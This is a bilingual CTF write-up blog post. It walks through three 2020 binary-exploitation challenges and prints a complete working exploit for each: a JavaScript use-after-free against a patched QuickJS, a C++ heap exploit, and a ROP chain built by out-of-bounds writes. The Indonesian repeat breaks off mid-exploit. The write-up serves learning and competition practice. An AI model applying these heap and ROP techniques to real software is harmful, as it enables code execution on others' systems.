---
layout: post
title:  "My 3 favorite CTF problems from 2020"
description: From Indonesian CTF's
permalink: /posts/my-three-favorite-ctf-problems-from-2020/
categories: writeup
---

_Untuk bahasa Indonesia, silakan klik link [ini](#indonesian)_

## English
2020 was a pretty bad year all around, but doing CTF's was still really fun. In 2020, I participated in seven (7) CTF's, won four (4) and conducted one (1). From all those CTF's, here are my three favorite problems.

### 1. NotSoFast (Redmask CTF 2020 Quals)
NotSoFast was a Javascript Exploitation challenge, with the quick js engine. The author of this problem was non other then Usman Abdul Halim, the legend himself. You can find all the challenge files [here](https://drive.google.com/drive/folders/1MWZBBxaByKVMAgB-7WlES8cGFbuXjP5F?usp=sharing).

The quick js engine is open source, and the challenge itself recompiles quick js, but first introduces a patch. The bug in this challenge in presented in this patch.

```patch
diff --git a/quickjs-libc.c b/quickjs-libc.c
index e8b81e9..9b1cb23 100644
--- a/quickjs-libc.c
+++ b/quickjs-libc.c
@@ -3689,6 +3689,13 @@ static JSValue js_print(JSContext *ctx, JSValueConst this_val,
     return JS_UNDEFINED;
 }
 
+static JSValue js_detachArrayBuffer(JSContext *ctx, JSValue this_val,
+                                    int argc, JSValue *argv)
+{
+    JS_DetachArrayBuffer(ctx, argv[0]);
+    return JS_UNDEFINED;
+}
+
 void js_std_add_helpers(JSContext *ctx, int argc, char **argv)
 {
     JSValue global_obj, console, args;
@@ -3697,6 +3704,11 @@ void js_std_add_helpers(JSContext *ctx, int argc, char **argv)
     /* XXX: should these global definitions be enumerable? */
     global_obj = JS_GetGlobalObject(ctx);
 
+    /* Add new how2heap helper function */
+    JS_SetPropertyStr(
+        ctx, global_obj, "ArrayBufferDetach",
+        JS_NewCFunction(ctx, js_detachArrayBuffer, "ArrayBufferDetach", 1));
+
     console = JS_NewObject(ctx);
     JS_SetPropertyStr(ctx, console, "log",
                       JS_NewCFunction(ctx, js_print, "log", 1));
diff --git a/quickjs.c b/quickjs.c
index a39ff8f..f78143a 100644
--- a/quickjs.c
+++ b/quickjs.c
@@ -51057,6 +51057,8 @@ void JS_DetachArrayBuffer(JSContext *ctx, JSValueConst obj)
         return;
     if (abuf->free_func)
         abuf->free_func(ctx->rt, abuf->opaque, abuf->data);
+    /* add how2heap functions */
+    #if 0
     abuf->data = NULL;
     abuf->byte_length = 0;
     abuf->detached = TRUE;
@@ -51073,6 +51075,7 @@ void JS_DetachArrayBuffer(JSContext *ctx, JSValueConst obj)
             p->u.array.u.ptr = NULL;
         }
     }
+    #endif
 }
 
 /* get an ArrayBuffer or SharedArrayBuffer */
```

It's kinda hard if you dont understand patch files, but basically what it does is it adds a function to free an ArrayBuffer (named ArrayBufferDetach), and adds a Use-After-Free bug (the ptr is not nulled).

The dockerfile is also given in the challenge files, and it shows that it uses ubuntu 18.04.

If you have knowledge in Heap Exploitation, you might already be thinking about possible solutions, possibly exploiting tcache double free. But sad news:

![Error](/assets/images/3_Favorite_Problems_2020/1.png)

Welp there goes that idea. In the end since this is a UAF already all we have to do is get a leak and abuse the tcache bin in a basic way. Oh, and we have to do it all in JS, instead of my usual python+pwntools. I found [this](https://gist.github.com/itszn/73cc299b9bcff1ed585e6206d1ade58e) gist on github which helped me with the utility functions that I needed.

Here's my full exploit:

```js
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes.reverse());
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);
Int64.Eight = new Int64(8);

// That's all the arithmetic we need for exploiting WebKit.. :)
//
// Utility functions.
//
// Copyright (c) 2016 Samuel Groß
//

// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();



var system_off = 0x4f550
var fh_off = 0x3ed8e8
var fh = 0
var system = 0
var a = new ArrayBuffer(0x350)
var b = new ArrayBuffer(0x350)
var c = new ArrayBuffer(0x350)
var d = new ArrayBuffer(0x350)
var e = new ArrayBuffer(0x350)
var f = new ArrayBuffer(0x350)
var g = new ArrayBuffer(0x350)
var h = new ArrayBuffer(0x350)
var dv = new DataView(a)
var dvv = new DataView(h)
dv.setInt32(16, 0x41424344)
ArrayBufferDetach(b)
ArrayBufferDetach(c)
ArrayBufferDetach(d)
ArrayBufferDetach(e)
ArrayBufferDetach(f)
ArrayBufferDetach(g)
ArrayBufferDetach(a)
ArrayBufferDetach(h)
var r = dvv.getFloat64(128)

r = Int64.fromDouble(r) - 0x3ebca0
fh = r + fh_off
system = r + system_off
console.log(fh)
console.log(fh / 0x100)
dv.setInt8(0, fh)
dv.setInt8(1, fh / 0x100)
dv.setInt8(2, fh / 0x10000)
dv.setInt8(3, fh / 0x1000000)
dv.setInt8(4, fh / 0x100000000)
dv.setInt8(5, fh / 0x10000000000)
dv.setInt8(6, fh / 0x1000000000000)
h = new ArrayBuffer(0x350)
a = new ArrayBuffer(0x350)
dvv = new DataView(a)
dv = new DataView(h)
dvv.setInt8(0, system)
dvv.setInt8(1, system / 0x100)
dvv.setInt8(2, system / 0x10000)
dvv.setInt8(3, system / 0x1000000)
dvv.setInt8(4, system / 0x100000000)
dvv.setInt8(5, system / 0x10000000000)
dvv.setInt8(6, system / 0x1000000000000)


dv.setInt8(0, 0x73)
dv.setInt8(1, 0x68)
ArrayBufferDetach(h)
EOF
```

The EOF is there because of how the challenge runs, see the [challenge files](https://drive.google.com/drive/folders/1MWZBBxaByKVMAgB-7WlES8cGFbuXjP5F?usp=sharing).

My exploit is pretty ugly, but sometimes for no reason I would get "Double free detected", this one just happened to not get it :v



### 2. ChinPoPomon (Compfest CTF 2020 Finals) (My own Problem)
ChinPoPomon was a C++ exploitation challenge, that abuses how strings work. The author of this challenge was myself. You can find all the challenge files [here](https://drive.google.com/drive/folders/1MWZBBxaByKVMAgB-7WlES8cGFbuXjP5F?usp=sharing)

The name is a play on Chinpokomon, from South Park

The challenge itself is a simple program, where the user can create a ChinPoPomon, aswell as move ChinPoPomon from pocket to pc (like in a pokemon game). The bug is located in the code to move a ChinPoPomon from our pocket to the pc.

```cpp
void deposit_ChinPoPomon(vector<ChinPoPomon*> &pc)	{
	int choice;
	cout << "Choose pocket index: ";
	cin >> choice;
	if(choice > 5)	{
		cout << "Prof. Kinny: This isn't the time to do that!" << endl;
		return;
	}
    if(my_pocket[choice] != NULL)	{
        ...
```

There is an OOB there, since the choice variable can be a negative number! The my_pocket variable is a global variable, so lets see what else is in the global variables.

```cpp
string my_name;
ChinPoPomon *my_pocket[6];
```

A nice string right before the array :)

Well, how does string actually work in C++ on memory level? Well, it's actually simple. The process allocates 4 words for the string initailly. The first word in the pointer to the string. The second word is the length of the string. The third and fourth word together is a 16 byte buffer. The buffer is used for strings that have a length less than 16. Anything more and the heap is used.

So recap: string length < 16 -> pointer to buffer. String length >= 16 -> pointer heap buffer

Using this knowledge, we can input a string that is a pointer value, and use that in order to get address leaks like heap and libc

<br>

To get a write, lets see how exactly the ChinPoPomon class is implemented

```cpp
class ChinPoPomon
{
private:
	const char *type;
	string nickname;
	int curr_level;
	int curr_xp;
	void init_level_xp()	{
		this->curr_level = (rand() % 1000);
		this->curr_xp = (rand() % 1000);
	}
public:
	ChinPoPomon():nickname(NULL), type(NULL)	{
		init_level_xp();
	}
	ChinPoPomon(const char *type, string nickname)	{
		this->type = type;
		this->nickname = nickname;
	}
	void view_stats()	{
		cout << "Type: " << this->type << endl;
		cout << "Current Level: " << this->curr_level << endl;
		cout << "Current XP: " << this->curr_xp << endl;
		this->speak();

	}
	void speak()	{
		cout << this->nickname << ", " << this->nickname << "!" << endl;
	}
};


...
...
...

for (int i = 0; i < pc.size(); ++i)
	delete pc[i];	// Prevent memory leaks
```

With this knowledge, we can abuse the string attribute in the ChinPoPomon class in order to get an aribitrary write, with techniques like the [House of Botcake](https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_botcake.c)

Below is my exploit

```py
from pwn import *
import codecs

p = process('./chinpopomon')


def set_name(name):
	p.sendlineafter("name?", name)

def create(type_num, nickname):
	p.sendlineafter("Choice:", '1')
	p.sendlineafter("Choice:", str(type_num))
	p.sendlineafter("Name: ", nickname)

def enter_pc():
	p.sendlineafter("Choice:", '2')

def exit_pc():
	p.sendlineafter("Choice:", '4')

def restart_game():
	p.sendlineafter("Choice:", '3')

def deposit(index):
	p.sendlineafter("PC Choice:", '1')
	p.sendlineafter("index:", str(index))

def withdraw(index):
	p.sendlineafter("PC Choice:", '2')
	p.sendlineafter("index:", str(index))

def view_stats(index):
	p.sendlineafter("PC Choice:", '3')
	p.sendlineafter("index:", str(index))


# Get libc leak
set_name(p64(0x4072d8) + p64(0x407280)[:-1])
enter_pc()
deposit(-2)
view_stats(0)

libc_leak = int(codecs.encode(p.recvuntil("\x7f")[-6:][::-1], 'hex'), 16)
libc_base = libc_leak - 0x3c7ce0
free_hook = libc_base + 0x1c9b28
system = libc_base + 0x30410
print(hex(libc_base))

withdraw(0)
exit_pc()
restart_game()



# Get heap leak
set_name(p64(0x4072d8) + p64(0x4072e0)[:-1])
create(1, 'qwe')
enter_pc()
deposit(-2)
view_stats(0)

p.recvuntil('Type: ')
heap_leak = int(codecs.encode(p.recvuntil("\n")[:-1][::-1], 'hex'), 16)
heap_base = heap_leak - 0x12ee0
print(hex(heap_base))

withdraw(0)
exit_pc()
for i in range(16):
	create(1, 'qwe')
restart_game()

set_name("ASD")
for i in range(10):
	create(1, (p64(heap_base+0x130f0)*2 + p64(5)).ljust(0x100, b"A") )
	enter_pc()
	deposit(0)
	exit_pc()
restart_game()

to_free = heap_base + 0x14040
print(hex(to_free))
set_name(p64(to_free))
create(1, "A"*0x100)
enter_pc()
deposit(-2)
exit_pc()
restart_game()


set_name("sh;\x00"*64)
create(1, p64(free_hook)*36)
create(1, p64(system)*32)
enter_pc()
deposit(-4)
exit_pc()
restart_game()


p.interactive()
p.close()
```

This challenge was fun to create, as class and string tricks were something that I always wanted to learn, and creating this challenge definitely helped me to learn them.

### 3. Sorting Game (Cyber Jawara 2020 Finals)
Sorting game was probably the most frustrating problem out of all of these, since it was sorta random and weird. I'm probably just dumb but thats how it was. The author of this problem the even MORE LEGEND Fariskhi Vidyan. You can find all the challenge files [here](https://drive.google.com/drive/folders/1MWZBBxaByKVMAgB-7WlES8cGFbuXjP5F?usp=sharing).

Sorting game was a 1v1 game vs an AI, in order to sort an array of numbers (to be ascending) by changing their respective values. The player that changes the last number in order to create a sorted array is the winner.

The first bug is in the check of whether or not the array is sorted.

![Error](/assets/images/3_Favorite_Problems_2020/2.png)

There is an OOB read by that piece of code, where the program checks one word behind the array. The one word behind the array is a pointer to a "cost" variable, which holds the cost of the game. The cost is kinda weird, just see for yourself:

![Error](/assets/images/3_Favorite_Problems_2020/3.png)

It's really weird, and sorta irreversible (unless im dumb). This will be used as our aribitrary write later on.

<br>

The first thing we need is a stack leak, and from the previous OOB we can actually get a stack leak. The trick is as following: Let's assume every single value in the array except the first is very large, and all in ascending order. We then guess the value for the value before the array, since the check is done for the word before the array, if our guess is larger than the previous word, then we win, else the AI wins. Using this knowledge we can use [binary search](https://en.wikipedia.org/wiki/Binary_search_algorithm) to find the value of the previous word.

Once we have that value, we can change the value of the pointer with another bug

![Error](/assets/images/3_Favorite_Problems_2020/4.png)

There is an OOB write, meaning we can write the previous word. The previous word is a pointer, meaning we can write anywhere! Well since PIE and ASLR is on not much can be done, but since we have a stack leak we can write a ROP chain using the cost variable. From there we get a libc leak, then write another ROP chain to get a shell.

Well writing to the cost variable is kinda weird but using z3 I got like a 50% chance to get the arbitrary write.

Here's my full exploit:

```py


from pwn import *
from z3 import *
import codecs

p = process('./sorting_game')

largest_number = 0x0000fffffffffffe

# print(lst)

lo = 0
hi = largest_number
haha = 54
for j in range(haha):
	mid = (lo + hi) // 2
	p.sendlineafter("nomor bilangan:", str(1))
	p.sendlineafter("baru:", str(largest_number))
	p.sendlineafter("nomor bilangan:", str(2))
	p.sendlineafter("baru:", str(largest_number-1))

	for i in range(30):
		p.sendlineafter("nomor bilangan:", str(32-i))
		# print(str(largest_number - i))
		p.sendlineafter("baru:", str(largest_number - 32 + i))

	p.sendlineafter("nomor bilangan:", str(1))
	p.sendlineafter("baru:", str(mid))
	ans = p.recvuntil("menang!").decode('ascii')
	if("Anda menang!" in ans):
		hi = mid - 1
	else:
		lo = mid + 1
	if(j != haha-1):
		p.sendlineafter("(Y/N)", 'Y')

stack_leak = lo
print(hex(stack_leak))



def adder(amount, address, not_help=True, aaa = False):

	if(not_help):
		p.sendlineafter("(Y/N)", 'Y')
	p.sendlineafter("nomor bilangan:", str(1))
	p.sendlineafter("baru:", str(largest_number))
	p.sendlineafter("nomor bilangan:", str(2))
	p.sendlineafter("baru:", str(largest_number-1))
	p.sendlineafter("nomor bilangan:", str(3))
	p.sendlineafter("baru:", str(largest_number-2))

	for i in range(29):
		p.sendlineafter("nomor bilangan:", str(32-i))
		# print(str(largest_number - i))
		p.sendlineafter("baru:", str(largest_number - 32 + i))

	p.sendlineafter("nomor bilangan:", str(0))
	p.sendlineafter("baru:", str(address))
	# pause()
	p.sendlineafter("nomor bilangan:", str(2))

	s = Solver()
	x = BitVec('x', 64)
	if(aaa):
		x = BitVec('x', 32)
		s.add(x < 0x7fffffff)
	s.add((((4294967233 - x) & 0xffffffff) ^ (((4294967233 - x) & 0xffffffff) >> 0x1f)) - (((4294967233 - x) & 0xffffffff) >> 0x1f) == amount - 0x3f)
	s.check()
	hehe = s.model()[x]
	print(hehe)
	p.sendlineafter("baru:", str(hehe))

adder(0x6b, stack_leak + 0x128)
adder((stack_leak + 0x1d0) & 0xffffffff, stack_leak + 0x130, aaa=True)
adder((stack_leak + 0x1d0) >> 32, stack_leak + 0x134, aaa=True)
adder(0x634, stack_leak + 0x138)
adder(0x7ffffc38, stack_leak + 0x158)
adder(0x7ffffc38, stack_leak + 0x158)
# adder(0x330394ad, stack_leak + 0x158)
adder(0x3fffffff, stack_leak + 0x15c)
adder(0x3fffffff, stack_leak + 0x15c)
adder(0x3fffffff, stack_leak + 0x15c)
adder(0x3fffffff+3, stack_leak + 0x15c)
adder(0x7fffffcf, stack_leak + 0x160)
adder(0x7fffffcf, stack_leak + 0x160)
adder(0xc4, stack_leak + 0x160)
adder(0x3fffffff, stack_leak + 0x164)
adder(0x3fffffff, stack_leak + 0x164)
adder(0x3fffffff, stack_leak + 0x164)
adder(0x3fffffff+3, stack_leak + 0x164)
adder(0x6f0, stack_leak + 0x170)

# pause()

p.sendlineafter("(Y/N)", 'N')
libc_leak = int(codecs.encode(p.recvuntil("\x7f")[-6:][::-1], 'hex'), 16)
libc_base = libc_leak - 0x228190

print(hex(libc_base))

adder(0x4a7, stack_leak + 0x178, not_help=False)

adder(0x62, stack_leak + 0x168)

# adder((libc_base + 0x0000000000026b6e) & 0xffffffff, stack_leak + 180)
# while(p.recvuntil("menang!", timeout=1) == b''):
# adder((libc_base + 0x0000000000026b6e) >> 32, stack_leak + 0x184)
adder((libc_base + 0x0000000000027b72) & 0xffffffff, stack_leak + 0x1a0,aaa=True)
adder((libc_base + 0x0000000000027b72) >> 32, stack_leak + 0x1a4,aaa=True)
adder((libc_base + 0x1b85aa) & 0xffffffff, stack_leak + 0x1a8,aaa=True)
adder((libc_base + 0x1b85aa) >> 32, stack_leak + 0x1ac,aaa=True)
adder((libc_base + 0x000000000004a1f3) & 0xffffffff, stack_leak + 0x1b0,aaa=True)
adder((libc_base + 0x000000000004a1f3) >> 32, stack_leak + 0x1b4,aaa=True)
adder((libc_base + 0x00000000000286e7) & 0xffffffff, stack_leak + 0x1d8,aaa=True)
adder((libc_base + 0x00000000000286e7) >> 32, stack_leak + 0x1dc,aaa=True)
adder((libc_base + 0x0000000000027b72+1) & 0xffffffff, stack_leak + 0x1f8,aaa=True)
adder((libc_base + 0x0000000000027b72+1) >> 32, stack_leak + 0x1fc,aaa=True)
adder((libc_base + 0x56410) & 0xffffffff, stack_leak + 0x200,aaa=True)
adder((libc_base + 0x56410) >> 32, stack_leak + 0x204,aaa=True)


pause()
p.sendlineafter("(Y/N)", 'N')


p.interactive()
p.close()
```

I was the first to solve this challenge during the competition btw :)


### Closing Statement
Well 2020 was a disaster but the CTF's were awesome. Let's hope 2021 is even better :D

<br>
<br>
<br>

## Indonesian
Tahun 2020 cukup parah, tapi mengerjakan soal CTF tetap seru. Pada tahun 2020, saya sendiri berpartisipasi di tujuh (7) CTF, menang empat (4) and mengadakan satu (1). Dari semua CTF itu, berikut 3 soal favoritku.

### 1. NotSoFast (Redmask CTF 2020 Quals)
NotSoFast merupakan soal _Javascript Exploitation_ yang menggunakan engine quick js. Pembuat soal ini tidak lain dan tidak bukan Usman Abdul Halim, sang jago. Anda dapat unduh semua file soal ini pada link [ini](https://drive.google.com/drive/folders/1MWZBBxaByKVMAgB-7WlES8cGFbuXjP5F?usp=sharing)

Engine quick js merupakan proyek yang open source, dan soal ini meng-_compile_ ulang quick js, tapi menambahkan suatu patch terlebih dahulu. Bug pada soal ini terdapat pada patchnya.

```patch
diff --git a/quickjs-libc.c b/quickjs-libc.c
index e8b81e9..9b1cb23 100644
--- a/quickjs-libc.c
+++ b/quickjs-libc.c
@@ -3689,6 +3689,13 @@ static JSValue js_print(JSContext *ctx, JSValueConst this_val,
     return JS_UNDEFINED;
 }
 
+static JSValue js_detachArrayBuffer(JSContext *ctx, JSValue this_val,
+                                    int argc, JSValue *argv)
+{
+    JS_DetachArrayBuffer(ctx, argv[0]);
+    return JS_UNDEFINED;
+}
+
 void js_std_add_helpers(JSContext *ctx, int argc, char **argv)
 {
     JSValue global_obj, console, args;
@@ -3697,6 +3704,11 @@ void js_std_add_helpers(JSContext *ctx, int argc, char **argv)
     /* XXX: should these global definitions be enumerable? */
     global_obj = JS_GetGlobalObject(ctx);
 
+    /* Add new how2heap helper function */
+    JS_SetPropertyStr(
+        ctx, global_obj, "ArrayBufferDetach",
+        JS_NewCFunction(ctx, js_detachArrayBuffer, "ArrayBufferDetach", 1));
+
     console = JS_NewObject(ctx);
     JS_SetPropertyStr(ctx, console, "log",
                       JS_NewCFunction(ctx, js_print, "log", 1));
diff --git a/quickjs.c b/quickjs.c
index a39ff8f..f78143a 100644
--- a/quickjs.c
+++ b/quickjs.c
@@ -51057,6 +51057,8 @@ void JS_DetachArrayBuffer(JSContext *ctx, JSValueConst obj)
         return;
     if (abuf->free_func)
         abuf->free_func(ctx->rt, abuf->opaque, abuf->data);
+    /* add how2heap functions */
+    #if 0
     abuf->data = NULL;
     abuf->byte_length = 0;
     abuf->detached = TRUE;
@@ -51073,6 +51075,7 @@ void JS_DetachArrayBuffer(JSContext *ctx, JSValueConst obj)
             p->u.array.u.ptr = NULL;
         }
     }
+    #endif
 }
 
 /* get an ArrayBuffer or SharedArrayBuffer */
```

Agak sulit kalau gak ngerti file patch, tapi intinya patch tersebut menambahakan suatu fungsi untuk _free_ suatu ArrayBuffer (bernama ArrayBufferDetach), dan menambahkan suatu bug Use-After-Free (ptr-nya tidak di-_null_-kan)

Dockerfile juga diberikan, dan hal tersebut menunjukakn bahwa soal ini menggunakan ubuntu 18.04

Jika Anda sudah punya ilmu tentang _Heap Exploitation_, mungkin Anda kepikiran solusi seperti tcache double free. Akan tetapi ada berita buruk:

![Error](/assets/images/3_Favorite_Problems_2020/1.png)

Yah gabisa gitu jadinya. Yasudah karena sudah ada UAF yang perlu kita lakukan hanyalah mendapatkan _leak_ dan gunakan tcache bin dengan cara yang biasa. Oh dan kita harus lakukan semuanya dalam JS, daripada cara biasa yaitu python+pwntools. Saya temukan gist [ini](https://gist.github.com/itszn/73cc299b9bcff1ed585e6206d1ade58e) di github yang membantu saya dengan fungsi-fungsi utility yang saya perlukan

Berikut _exploit_ lengkap saya:

```js
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes.reverse());
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);
Int64.Eight = new Int64(8);

// That's all the arithmetic we need for exploiting WebKit.. :)
//
// Utility functions.
//
// Copyright (c) 2016 Samuel Groß
//

// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();



var system_off = 0x4f550
var fh_off = 0x3ed8e8
var fh = 0
var system = 0
var a = new ArrayBuffer(0x350)
var b = new ArrayBuffer(0x350)
var c = new ArrayBuffer(0x350)
var d = new ArrayBuffer(0x350)
